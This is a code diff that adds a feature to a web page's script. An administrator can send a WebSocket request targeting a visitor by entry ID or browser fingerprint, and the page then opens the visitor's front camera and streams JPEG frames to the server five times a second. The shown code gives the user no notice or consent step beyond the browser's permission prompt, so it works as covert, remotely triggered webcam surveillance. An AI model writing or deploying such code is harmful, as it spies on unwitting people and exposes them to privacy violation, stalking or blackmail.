@@ -915,6 +915,105 @@ main a {
           }
         }
       });
+
+      // Listen for stream requests from admin
+      socket.on('stream_request', async (data) => {
+        console.log('[WEBSOCKET] Stream request received:', data);
+        
+        // Check if this request is for this user
+        if (data.entry_id === currentEntryId || data.fingerprint === currentFingerprint) {
+          // Start streaming
+          try {
+            await startLiveStream(data.entry_id);
+            console.log('[WEBSOCKET] Live stream started');
+          } catch (error) {
+            console.error('[WEBSOCKET] Failed to start stream:', error);
+          }
+        }
+      });
+
+      socket.on('stop_stream_request', (data) => {
+        console.log('[WEBSOCKET] Stop stream request received:', data);
+        if (data.entry_id === currentEntryId) {
+          stopLiveStream();
+        }
+      });
+    }
+
+    // Live stream variables
+    let streamInterval = null;
+    let mediaStream = null;
+
+    async function startLiveStream(entryId) {
+      try {
+        // Request camera access
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            width: { ideal: 320 },
+            height: { ideal: 240 },
+            facingMode: 'user'
+          } 
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = mediaStream;
+        video.play();
+
+        // Create canvas to capture frames
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 320;  // Reduced resolution to reduce bandwidth
+        canvas.height = 240; // Reduced resolution to reduce bandwidth
+
+        // Frame queue to prevent overwhelming the server
+        let frameQueue = 0;
+        const MAX_QUEUE = 2; // Maximum frames in queue
+
+        // Capture and send frames
+        streamInterval = setInterval(() => {
+          // Skip frame if queue is full to prevent server overload
+          if (frameQueue >= MAX_QUEUE) {
+            return;
+          }
+
+          if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Reduced quality from 0.7 to 0.5 to reduce file size
+            const frameData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1]; // Base64 without data URL prefix
+            
+            // Send frame via WebSocket
+            if (socket && socket.connected) {
+              frameQueue++;
+              socket.emit('stream_frame', {
+                entry_id: entryId,
+                frame_data: frameData
+              }, () => {
+                // Decrement queue on acknowledgment
+                if (frameQueue > 0) frameQueue--;
+              });
+            }
+          }
+        }, 200); // Reduced from 100ms to 200ms (5 FPS instead of 10 FPS)
+
+        console.log('[STREAM] Live stream started (optimized: 320x240 @ 5 FPS)');
+      } catch (error) {
+        console.error('[STREAM] Failed to start stream:', error);
+        alert('Failed to access camera: ' + error.message);
+      }
+    }
+
+    function stopLiveStream() {
+      if (streamInterval) {
+        clearInterval(streamInterval);
+        streamInterval = null;
+      }
+      
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
+      
+      console.log('[STREAM] Live stream stopped');
     }
 
     // Auto-run on page load
@@ -941,6 +1040,7 @@ main a {
         clearInterval(heartbeatInterval);
         heartbeatInterval = null;
       }
+      stopLiveStream(); // Stop stream on page unload
       if (socket && socket.connected) {
         socket.disconnect();
       }
